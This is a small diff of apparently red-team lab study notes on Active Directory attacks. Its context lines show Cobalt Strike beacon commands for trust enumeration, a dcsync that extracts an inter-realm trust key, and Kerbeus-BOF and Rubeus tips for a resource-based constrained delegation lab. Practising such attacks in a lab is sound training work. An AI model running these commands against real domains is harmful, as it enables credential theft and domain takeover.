@@ -90,10 +90,9 @@ beacon> ldapsearch "(&(objectClass=trustedDomain)(trustPartner=contoso.com))" --
 beacon> dcsync PARTNER\<TDO-GUID>    // extracts RC4/AES inter-realm trust key — note the GUID syntax
 ```
 
-
 ---
 
-### 5. RBCD lab
+### 5. [RBCD lab](/labs/RBCD-lab.md)  
 
 Seven phases, SOCKS required, three separate execution contexts that must stay straight:
 
@@ -108,8 +107,6 @@ Seven phases, SOCKS required, three separate execution contexts that must stay s
 - `krb_dump /luid:3e7` NOT `/luid:0x3e7` — Kerbeus-BOF rejects the `0x` prefix
 - Rubeus output filename: `_cifs_lon-fs-1` (underscore prefix, no extension) — check exact name in output
 - Restore RBCD after use: `Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1`
-
-Lab file: `labs/RBCD-lab.md`
 
 ---
 
